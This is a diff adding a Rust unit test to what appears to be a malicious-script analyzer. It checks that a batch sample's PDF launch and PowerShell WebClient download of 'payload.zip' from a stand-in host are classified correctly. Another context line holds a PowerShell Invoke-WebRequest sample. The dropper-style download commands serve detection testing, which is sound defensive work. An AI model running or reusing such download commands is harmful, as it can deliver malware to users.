@@ -1216,6 +1216,43 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p"
     }
 
     #[test]
+    fn batch_pdf_launch_near_powershell_download_is_not_download_trait() {
+        let script = br#"
+@echo off
+start "" "https://opened.example/a.pdf"
+set "zipUrl=https://opened.example/payload.zip"
+set "destination=%USERPROFILE%\Downloads\payload.zip"
+powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl%', '%destination%') }"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlLaunch { url, .. } if url == "https://opened.example/a.pdf"
+            )),
+            "PDF launch should remain UrlLaunch: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://opened.example/payload.zip"
+            )),
+            "PowerShell ZIP download was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://opened.example/a.pdf"
+            )),
+            "PDF launch was misclassified as a download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn delayed_expansion_name_built_from_substring_chain() {
         // AbObUs-family / xworm-like obfuscators build a delayed-expansion
         // var name itself from a chain of `%alphabet:~N,1%` substring refs:
